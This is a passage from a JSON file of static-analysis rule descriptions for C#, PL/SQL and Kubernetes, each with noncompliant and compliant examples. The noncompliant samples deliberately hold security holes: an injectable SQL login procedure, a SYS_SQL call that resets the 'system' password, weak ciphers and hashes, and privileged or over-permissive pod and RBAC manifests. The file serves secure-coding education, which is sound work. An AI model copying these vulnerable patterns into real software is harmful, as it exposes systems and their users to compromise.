 Sensitive: a security-sensitive cookie is created with the secure flag set to false\n</pre>\n<p>The <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookie.secure?view=netframework-4.8\">default value</a> of\n<code>Secure</code> flag is <code>false</code>, unless overwritten by an application’s configuration file:</p>\n<pre>\nHttpCookie myCookie = new HttpCookie(\"Sensitive cookie\");\n//  Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)\n</pre>\n<h2>Compliant Solution</h2>\n<p>Set the <code>HttpCookie.Secure</code> property to <code>true</code>:</p>\n<pre>\nHttpCookie myCookie = new HttpCookie(\"Sensitive cookie\");\nmyCookie.Secure = true; // Compliant\n</pre>\n<p>Or change the default flag values for the whole application by editing the <a\nhref=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)\">Web.config configuration file</a>:</p>\n<pre>\n&lt;httpCookies httpOnlyCookies=\"true\" requireSSL=\"true\" /&gt;\n</pre>\n<ul>\n  <li> the <code>requireSSL</code> attribute corresponds programmatically to the <code>Secure</code> field. </li>\n  <li> the <code>httpOnlyCookies</code> attribute corresponds programmatically to the <code>httpOnly</code> field. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "plsql:S2070": {
        "name": "SHA-1 and Message-Digest hash algorithms should not be used in secure contexts",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=plsql%3AS4790'>S4790</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,\nit takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash\nvalue gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,\nMD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>\n<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nDBMS_CRYPTO.Hash(str, HASH_MD4);\n\nDBMS_CRYPTO.Hash(str, HASH_MD5);\n\nDBMS_CRYPTO.Hash(str, HASH_SH1);\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/328\">CWE-328 - Reversible One-Way Hash</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://shattered.io/\">SHAttered</a> - The first concrete collision attack against SHA-1. </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "plsql:SysOwnedFunctions": {
        "name": "Sensitive \"SYS\" owned functions should not be used",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Some Oracle packages contain powerful SYS-owned functions that can be used to perform malicious operations. For instance,\n<code>DBMS_SYS_SQL.PARSE_AS_USER</code> can be used to execute a statement as another user.</p>\n<p>Most programs do not need those functions and this rule helps identify them in order to prevent security risks.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nDECLARE\n  c INTEGER;\n  sqltext VARCHAR2(100) := 'ALTER USER system IDENTIFIED BY hacker'; -- Might be injected by the user\nBEGIN\n  c := SYS.DBMS_SYS_SQL.OPEN_CURSOR();                               -- Noncompliant\n\n   -- Will change 'system' user's password to 'hacker'\n  SYS.DBMS_SYS_SQL.PARSE_AS_USER(c, sqltext, DBMS_SQL.NATIVE, UID);  -- Non-Compliant\n\n  SYS.DBMS_SYS_SQL.CLOSE_CURSOR(c);                                  -- Noncompliant\nEND;\n/\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/269\">CWE-269 - Improper Privilege Management</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/270\">CWE-270 - Privilege Context Switching Error</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "plsql:S1523": {
        "name": "Dynamically executing code is security-sensitive",
        "htmlDesc": "<p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807\">CVE-2017-9807</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802\">CVE-2017-9802</a> </li>\n</ul>\n<p>Any code which is dynamically evaluated in your process will have the same permissions as the rest of your code. Thus it is very dangerous to do so\nwith code coming from an untrusted source. <a href=\"https://owasp.org/www-community/attacks/Code_Injection\">Injected Code</a> can either run on the\nserver or in the client (exemple: XSS attack).</p>\n<p><code>EXECUTE IMMEDIATE</code> executes as a dynamic SQL statement or anonymous PL/SQL block the string passed as an argument. It’s safe only if\nthe argument is composed of constant character string expressions. But if the command string is dynamically built using external parameters, then it\nis considered very dangerous because executing a random string allows the execution of arbitrary code.</p>\n<p>This rule marks for review each occurence of dynamic code execution.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>\n  <li> you really need to run code dynamically. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The best solution is to not run code provided by an untrusted source. If you really need to build a command string using external parameters, you\nshould use <code>EXECUTE IMMEDIATE</code> with bind variables instead.</p>\n<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCREATE OR REPLACE PROCEDURE ckpwd (p_user IN VARCHAR2, p_pass IN VARCHAR2)\nIS\n v_query  VARCHAR2(100);\n v_output NUMBER;\nBEGIN\n v_query :=    q'{SELECT COUNT(*) FROM user_pwd }'\n         ||    q'{WHERE username = '}'\n         ||    p_user\n         ||    q'{' AND password = '}'\n         ||    p_pass\n         ||    q'{'}';\n EXECUTE IMMEDIATE v_query\n  INTO v_output;\nEND;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCREATE OR REPLACE PROCEDURE ckpwd_bind (p_user IN VARCHAR2, p_pass IN VARCHAR2)\nIS\n v_query  VARCHAR2(100);\n v_output NUMBER;\nBEGIN\n v_query :=\n   q'{SELECT COUNT(*) FROM user_pwd WHERE username = :1 AND password = :2}';\n EXECUTE IMMEDIATE v_query\n  INTO v_output\n  USING p_user, p_pass;\nEND;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "plsql:S2278": {
        "name": "Neither DES (Data Encryption Standard) nor DESede (3DES) should be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=plsql%3AS5547'>S5547</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>\n<blockquote>\n  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer\n  provides the security that is needed to protect federal government information.</p>\n  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>\n</blockquote>\n<p>For similar reasons, RC2 should also be avoided.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPLS_INTEGER := DBMS_CRYPTO.ENCRYPT_DES\n                           + DBMS_CRYPTO.CHAIN_CBC\n                           + DBMS_CRYPTO.PAD_PKCS5;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPLS_INTEGER := DBMS_CRYPTO.ENCRYPT_AES256\n                           + DBMS_CRYPTO.CHAIN_CBC\n                           + DBMS_CRYPTO.PAD_PKCS5;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE\">DES / DESede Unsafe</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "plsql:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in <code>DBMS_CRYPTO</code></h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nPLS_INTEGER := DBMS_CRYPTO.ENCRYPT_DES              // Noncompliant\n                           + DBMS_CRYPTO.CHAIN_CBC\n                           + DBMS_CRYPTO.PAD_PKCS5;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nPLS_INTEGER := DBMS_CRYPTO.ENCRYPT_AES256\n                           + DBMS_CRYPTO.CHAIN_CBC\n                           + DBMS_CRYPTO.PAD_PKCS5;\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Oracles docs - <a href=\"https://docs.oracle.com/en/database/oracle/oracle-database/21/arpls/DBMS_CRYPTO.html\">DBMS_CRYPTO reference</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "plsql:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kubernetes:S6865": {
        "name": "Service account tokens should not be mounted in pods",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Service account tokens are Kubernetes secrets created automatically to authenticate applications running inside pods to the API server. If a pod is\ncompromised, an attacker could use this token to gain access to other resources in the cluster.</p>\n<p>For example, they could create new pods, modify existing ones, or even delete critical system pods, depending on the permissions associated with\nthe service account.</p>\n<p>Therefore, it’s recommended to disable the automounting of service account tokens when it’s not necessary for the application running in the\npod.</p>\n<h3>What is the potential impact?</h3>\n<h4>Unauthorized Access</h4>\n<p>If a pod with a mounted service account gets compromised, an attacker could potentially use the token to interact with the Kubernetes API, possibly\nleading to unauthorized access to other resources in the cluster.</p>\n<h4>Privilege Escalation</h4>\n<p>Service account tokens are often bound with roles that have extensive permissions. If these tokens are exposed, it could lead to privilege\nescalation where an attacker gains higher-level permissions than intended.</p>\n<h4>Data Breach</h4>\n<p>Service account tokens can be used to access sensitive data stored in the Kubernetes cluster. If these tokens are compromised, it could lead to a\ndata breach.</p>\n<h4>Denial of Service</h4>\n<p>An attacker with access to a service account token could potentially overload the Kubernetes API server by sending a large number of requests,\nleading to a Denial of Service (DoS) attack.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example-pod\nspec: # Noncompliant\n  containers:\n  - name: example-pod\n    image: nginx:1.25.3\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example-pod\nspec:\n  containers:\n  - name: example-pod\n    image: nginx:1.25.3\n  automountServiceAccountToken: false\n</pre>\n<h3>How does this work?</h3>\n<p>The automounting of service account tokens can be disabled by setting <code>automountServiceAccountToken: false</code> in the pod’s specification.\nAdditionally, it can be disabled in the configuration of an accompanied service account.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Kubernetes Documentation - <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\">Configure Service\n  Accounts for Pods</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/306\">CWE-306 - Missing Authentication for Critical Function</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6867": {
        "name": "Wildcards should not be used to define RBAC permissions",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Using wildcards when defining Role-Based Access Control (RBAC) permissions in Kubernetes can lead to significant security issues. This is because\nit grants overly broad permissions, potentially allowing access to sensitive resources.</p>\n<p>RBAC is designed to limit the access rights of users within the system by assigning roles to them. These roles define what actions a user can\nperform and on which resources. When a wildcard is used, it means that the role has access to all resources/verbs, bypassing the principle of least\nprivilege. This principle states that users should have only the minimal permissions they need to perform their job function.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker gains access to a role with wildcard permissions, they could potentially read, modify, or delete any resource in the Kubernetes\ncluster, leading to data breaches, service disruptions, or other malicious activities.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  namespace: default\n  name: example-role\nrules:\n  - apiGroups: [\"\"]\n    resources: [\"*\"] # Noncompliant\n    verbs: [\"get\", \"list\"]\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  namespace: default\n  name: example-role\nrules:\n  - apiGroups: [\"\"]\n    resources: [\"pods\"]\n    verbs: [\"get\", \"list\"]\n</pre>\n<h3>How does this work?</h3>\n<p>When defining RBAC permissions, it is important to follow the principle of least privilege. By explicitly specifying the verbs and resources a user\nshould have access to instead of using wildcards, it can be ensured that users have only the permissions they need to perform their job function.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Kubernetes Documentation - <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/rbac/\">Using RBAC Authorization</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6428": {
        "name": "Running containers in privileged mode is security-sensitive",
        "htmlDesc": "<p>Running containers in privileged mode can reduce the resilience of a cluster in the event of a security incident because it weakens the isolation\nbetween hosts and containers.</p>\n<p>Process permissions in privileged containers are essentially the same as root permissions on the host. If these processes are not protected by\nrobust security measures, an attacker who compromises a root process on a Pod’s host is likely to gain the ability to pivot within the cluster.<br>\nDepending on how resilient the cluster is, attackers can extend their attack to the cluster by compromising the nodes from which the cluster launched\nthe process.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The services of this Pod are accessible to people who are not administrators of the Kubernetes cluster. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Disable privileged mode.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      ports:\n        - name: web\n          containerPort: 80\n          protocol: TCP\n      securityContext:\n        privileged: true # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: example\nspec:\n  containers:\n    - name: web\n      image: nginx\n      ports:\n        - name: web\n          containerPort: 80\n          protocol: TCP\n      securityContext:\n        privileged: false\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6868": {
        "name": "Allowing command execution is security sensitive",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Allowing command execution (exec) for roles in a Kubernetes cluster can pose a significant security risk. This is because it provides the user with\nthe ability to execute arbitrary commands within a container, potentially leading to unauthorized access or data breaches.</p>\n<p>In a production Kubernetes cluster, exec permissions are typically unnecessary due to the principle of least privilege, which suggests that a user\nor process should only have the minimum permissions necessary to perform its function. Additionally, containers in production are often treated as\nimmutable infrastructure, meaning they should not be changed once deployed. Any changes should be made to the container image, which is then used to\ndeploy a new container.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exploiting Vulnerabilities Within the Container</h4>\n<p>If a user or service has the ability to execute commands within a container, they could potentially identify and exploit vulnerabilities within the\ncontainer’s software. This could include exploiting known vulnerabilities in outdated software versions, or finding and exploiting new\nvulnerabilities. This could lead to unauthorized access to the container, allowing the attacker to manipulate its operations or access its data.</p>\n<h4>Installing Malicious Software</h4>\n<p>Command execution permissions could also be used to install malicious software within a container. This could include malware, spyware, ransomware,\nor other types of harmful software. Once installed, this software could cause a wide range of issues, from data corruption or loss, to providing a\nbackdoor for further attacks. It could also be used to create a botnet, using the compromised container to launch attacks on other systems.</p>\n<h4>Extracting Sensitive Data</h4>\n<p>If an attacker has the ability to execute commands within a container, they could potentially access and extract sensitive data. This could include\nuser data, confidential business information, or other types of sensitive data. The extracted data could then be used for a wide range of malicious\npurposes, from identity theft to corporate espionage. This could lead to significant financial loss, damage to reputation, and potential legal\nconsequences.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  namespace: default\n  name: example-role\nrules:\n  - apiGroups: [\"\"]\n    resources: [\"pods\"]\n    verbs: [\"get\"]\n  - apiGroups: [\"\"]\n    resources: [\"pods/exec\"] # Noncompliant\n    verbs: [\"create\"]\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  namespace: default\n  name: example-role\nrules:\n  - apiGroups: [\"\"]\n    resources: [\"pods\"]\n    verbs: [\"get\"]\n</pre>\n<h3>How does this work?</h3>\n<p>The <code>exec</code> permissions are set by allowing the <code>create</code> verb for the <code>pods/exec</code> resource. Removing this\npermission will prevent users and services from executing arbitrary commands within containers.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Kubernetes Documentation - <a href=\"https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/\">Get a Shell to a\n  Running Container</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S6433": {
        "name": "Mounting sensitive file system paths is security-sensitive",
        "htmlDesc": "<p>Mounting sensitive file system paths can lead to information disclosure and compromise of the host systems.</p>\n<p>System paths can contain sensitive information like configuration files or cache files. Those might be used by attackers to expand permissions or\nto collect information for further attacks. System paths can also contain binaries and scripts that might be executed by the host system periodically.\nA compromised or rogue container with access to sensitive files could endanger the integrity of the whole Kubernetes cluster.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The mounted file path contains sensitive information. </li>\n  <li> The mounted file path contains configuration files or executables that are writable. </li>\n  <li> The Pod is untrusted or might contain vulnerabilities. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to avoid mounting sensitive system file paths into containers. If it is necessary to mount such a path due to the architecture,\nthe least privileges should be given, for instance by making the mount read-only to prevent unwanted modifications.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  containers:\n  - image: k8s.gcr.io/test-webserver\n    name: test-container\n    volumeMounts:\n    - mountPath: /data\n      name: test-volume\n  volumes:\n  - name: test-volume\n    hostPath:\n      path: /etc # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  containers:\n  - image: k8s.gcr.io/test-webserver\n    name: test-container\n    volumeMounts:\n    - mountPath: /data\n      name: test-volume\n  volumes:\n  - name: test-volume\n    hostPath:\n      path: /mnt/nfs\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://kubernetes.io/docs/concepts/storage/volumes/#hostpath\">Kubernetes Documentation</a> - Volumes </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kubernetes:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against tampering or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: curl\nspec:\n  template:\n    spec:\n      containers:\n      - name: curl\n        image: curlimages/curl\n        command: [\"curl\"]\n        args: 